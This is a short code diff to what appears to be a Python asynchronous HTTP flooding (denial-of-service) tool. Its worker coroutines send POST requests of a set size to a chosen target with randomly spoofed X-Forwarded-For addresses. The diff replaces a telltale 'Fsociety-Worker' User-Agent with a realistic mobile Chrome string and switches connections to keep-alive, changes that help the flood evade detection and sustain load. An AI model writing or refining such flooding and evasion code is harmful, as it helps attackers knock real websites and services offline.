@@ -7,6 +7,7 @@ _total_requests = 0
 _tasks = []
 _monitor_task = None
 
+
 async def _worker(worker_id, target, kb_size, on_update):
     global _is_running, _total_requests
     try:
@@ -29,10 +30,10 @@ async def _worker(worker_id, target, kb_size, on_update):
             try:
                 fake_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                 headers = {
-                    "User-Agent": f"Fsociety-Worker-{worker_id}",
+                    "User-Agent": "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
                     "X-Forwarded-For": fake_ip,
                     "Content-Type": "application/x-www-form-urlencoded",
-                    "Connection": "close"
+                    "Connection": "keep-alive"
                 }
                 async with session.post(target, data=data, headers=headers, timeout=10) as resp:
                     status = resp.status
